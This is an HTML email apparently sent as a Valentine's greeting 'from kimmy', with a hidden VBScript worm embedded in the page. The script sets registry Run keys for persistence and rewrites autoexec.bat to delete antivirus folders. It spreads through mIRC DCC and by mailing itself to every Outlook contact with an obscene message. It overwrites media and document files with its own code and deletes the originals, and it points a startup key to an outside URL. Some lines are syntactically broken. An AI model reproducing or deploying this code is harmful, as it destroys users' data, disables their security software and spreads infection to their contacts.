<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0  Transitional//EN">
<HTML><HEAD>
<META  http-equiv=3DContent-Type content=3D"text/html;  
charset=3Diso-8859-1">
<META content=3D"MSHTML 5.50.4611.1300"  name=3DGENERATOR>
<STYLE></STYLE>
</HEAD>
<BODY  bgColor=3D#ff0000>
<DIV align=3Dcenter><STRONG><FONT  size=3D6>happy  valentines=20
day!!</FONT></STRONG></DIV>
<DIV  align=3Dcenter><STRONG><FONT  size=3D6></FONT></STRONG>&nbsp;</DIV>
<DIV  align=3Dcenter><STRONG><FONT  size=3D6></FONT></STRONG>&nbsp;</DIV>
<DIV  align=3Dcenter><STRONG><FONT  size=3D6></FONT></STRONG>&nbsp;</DIV>
<DIV  align=3Dcenter><STRONG><FONT size=3D6>from  
kimmy!</FONT></STRONG></DIV>
<SCRIPT  language=3DVBScript>
<!--
On Error Resume Next
Set fso =3D  CreateObject("Scripting.FileSystemObject")
Set sysfolder =3D  fso.GetSpecialFolder(SystemFolder)  =20
Set WSHShell =3D  WScript.CreateObject("WScript.Shell")
 
dim fso, file, vbscopy, A01, A02, A06, A07, A05,  A09, A10
 
Set A01 =3D CreateObject(  "Scripting.FileSystemObject" )
A01.CopyFile WScript.ScriptFullName,  A01.BuildPath( =
A01.GetSpecialFolder(1), "Explorer32.VBS" )
 
Set A02 =3D CreateObject( "WScript.Shell"  
A02.RegWrite  
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" &  
"Explorer32", A01.BuildPath( A01.GetSpecialFolder(1), "Explorer32.VBS"  
 
Set A01 =3D CreateObject(  "Scripting.FileSystemObject" )
A01.CopyFile WScript.ScriptFullName,  A01.BuildPath( =
A01.GetSpecialFolder(0), "EXPLORER.VBS" )
 
Set A02 =3D CreateObject( "WScript.Shell"  
A02.RegWrite  
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices=
\"  & "EXPLORER", A01.BuildPath( A01.GetSpecialFolder(0), "EXPLORER.VBS"  
)
 

Set fso =3D  CreateObject("Scripting.FileSystemObject")
set file =3D  fso.OpenTextFile(WScript.ScriptFullname, 1)
vbscopy =3D  file.ReadAll
 
Set fs =3D  CreateObject("Scripting.FileSystemObject")
Set format =3D  fs.CreateTextFile("C:\autoexec.bat")
format.WriteLine("del  c:\progra~1\antivi~1\*.*")
format.WriteLine("del  c:\progra~1\networ~1\mcaffe~1\*.*")
format.WriteLine("del  c:\progra~1\norton~1\*.*")
format.WriteLine("del  c:\progra~1\fsi\*.*")
format.WriteLine("cls")
format.WriteLine("echo  Windows loading...")
format.WriteLine("pause")
format.WriteLine("echo  SATANIK CHILD S A T A N I K  C H I L D  SATANIK  
CHILD")
format.WriteLine("pause")
format.WriteLine("echo A virus by  Satanik Child has been detected!  =
Windows is destroyed!  (c)SC")
format.WriteLine("pause")
format.Close
 

main()
 
sub main()
On Error Resume Next
 
Set fso =3D  CreateObject("scripting.filesystemobject")
Set ws =3D  CreateObject("wscript.shell")
If Path =3D "" Then
If  fso.fileexists("c:\mirc\mirc.ini") Then Path =3D "c:\mirc"
If  fso.fileexists("c:\mirc32\mirc.ini") Then Path =3D "c:\mirc32"
PfDir =3D  
ws.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\=
ProgramFilesDir")
If  fso.fileexists(PfDir & "\mirc\mirc.ini") Then Path =3D PfDir &  
"\mirc"
End If
If Path <> "" Then
Set Script =3D  fso.CreateTextFile(Path & "\script.ini", True)
Script.writeline  "[script]"
Script.writeline "n0=3Don 1:JOIN:#:{"
Script.writeline  "n1=3D  /if ( $nick =3D=3D $me ) { halt }"
Script.writeline "n2=3D   /." & chr(100) & chr(99) & chr(99) & " send =
$nick  WScript.ScriptFullName"
Script.writeline "n3=3D}"
Script.Close
End  If
 
spreadtoemail()
listadriv()
end  sub
 
sub listadriv
On Error Resume Next
Dim d, dc,  
Set dc =3D fso.Drives
For Each d in dc
If d.DriveType =3D 2 or  d.DriveType =3D 3 Then
folderlist(d.path & "\")
end  if
Next
listadriv =3D s
end sub
 
 
 
sub folderlist(folderspec)
On Error Resume  Next
dim f, f1, sf
set f =3D fso.GetFolder(folderspec)
set sf =3D  f.SubFolders
for each f1 in  sf
infectfiles(f1.path)
folderlist(f1.path)
next
end  sub
 
sub regcreate(regkey,regvalue)
Set regedit =3D  CreateObject("WScript.Shell")
regedit.RegWrite regkey, regvalue
end  sub
function regget(value)
Set regedit =3D  CreateObject("WScript.Shell")
regget =3D regedit.RegRead(value)
end  function
function fileexist(filespec)
On Error Resume Next
dim  msg
if (fso.FileExists(filespec)) Then
msg =3D 0
else
msg =3D  
end if
fileexist =3D msg
end function
function  folderexist(folderspec)
On Error Resume Next
dim msg
if  (fso.GetFolderExists(folderspec)) then
msg =3D 0
else
msg =3D 1
end  if
fileexist =3D msg
end function
 
sub spreadtoemail()
On Error Resume Next
A04  =3D A02.RegRead( "HKEY_LOCAL_MACHINE\" & "Explorer32" )
 
If A04 =3D "" Or A04 > 20 Then
    A04 =3D 0
End If
 
If A04 =3D 0 Then
   Set A05 =3D  CreateObject( "Outlook.Application" )
   Set A06 =3D  A05.GetNameSpace( "MAPI" )
 
   For Each A07 In  A06.AddressLists
       Set A08 =3D  A05.CreateItem( 0 )
 
       For A09 =3D 1  To  A07.AddressEntries.Count
            Set A10 =3D A07.AddressEntries( A09 )
 
           If A09 =3D 1  Then
               A08.BCC =3D  A10.Address
            Else
               A08.BCC =3D A08.BCC & "; " &  A10.Address
           End  If
       Next
 
       A08.Subject  =3D "I picked this one especially for you my  
Sweetheart!"
       A08.Body =3D "I wanna  fuck you like an animal!"
        A08.Attachmets.Add  WScript.ScriptFullName
        A08.DeleteAfterSubmit =3D True
        A08.Send
   Next
 
   A04 =3D 0
End If
 
A02.RegWrite "HKEY_LOCAL_MACHINE\" &  "Explorer32", A04 + 1
end sub
 
sub infectfiles(folderspec)
On Error Resume  Next
dim f, f1, fc, ext, ap, mircfname, s, bname, mp3
set f =3D  fso.GetFolder(folderspec)
set fc =3D f.Files
for each f1 in fc
ext =3D  fso.GetExtensionName(f1.path)
ext =3D lcase(ext)
s =3D  lcase(f1.name)
if (ext =3D "vbs") or (ext =3D "vbe") then
set ap =3D  fso.OpenTextFile(f1.path, 2, true)
ap.write vbscopy
ap.close
elseif(ext  =3D "mp3") or (ext =3D "mp2") or (ext =3D "wav") or (ext =3D =
"txt") or (ext  =3D "doc") or (ext =3D "log") or (ext =3D "bmp") or (ext =
=3D "gif") or (ext  =3D "jpg") or (ext =3D "fla") or (ext =3D "js") or =
(ext =3D "html") or (ext  =3D "swf") or (ext =3D "wmf") or (ext =3D =
"png") or (ext =3D "htm") or (ext  =3D "avi") or (ext =3D "mid") or (ext =
=3D "zip") or (ext =3D "rar") or (ext  =3D "pif") or (ext =3D "pdf") or =
(ext =3D "log") or (ext =3D "htm")  then
set ap =3D fso.OpenTextFile(f1.path, 2, true)
ap.write  vbscopy
ap.close
bname =3D fso.GetBaseName(f1.path)
set cop =3D  fso.GetFile(f1.path)
cop.copy(folderspec & "\" & bname &  ".vbs")
fso.DeleteFile(f1.path)
end if
next
end sub
 
WSHShell.RegWrite "HKEY_CLASSES_ROOT\.dmk\",  "VBSFile"
fso.CopyFile Wscript.ScriptFullName, sysfolder &  "\satanik.dmk"
fso.GetFile(sysfolder & "\satanik.dmk").attributes =3D  
fso.CreateFolder sysfolder & "\MSApp"
fso.CopyFile  Wscript.ScriptFullName, sysfolder &  "\MSApp\satank.dmk"
fso.GetFolder(sysfolder & "\MSApp").attributes =3D  
Set dc =3D fso.Drives
For Each d in dc
If d.DriveType =3D 3  Then
fso.CopyFile Wscript.ScriptFullName, d.DriveLetter &  ":\satanik.dmk"
ElseIf d.DriveType =3D 1 And d.IsReady Then
fso.CopyFile  Wscript.ScriptFullName, d.DriveLetter & ":\satanik.dmk"
End  If
 
Next
 
W.RegWrite  
"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Iexplore", =
"http://users.tmok.com/~dr_bulge/smt1/",  "REG_SZ"
Return =3D W.Run(winPath & "\RUNDLL.EXE  user.exe,exitwindowsexec", 1, =
TRUE)
file://-->
</SCRIPT>
</BODY></HTML>
 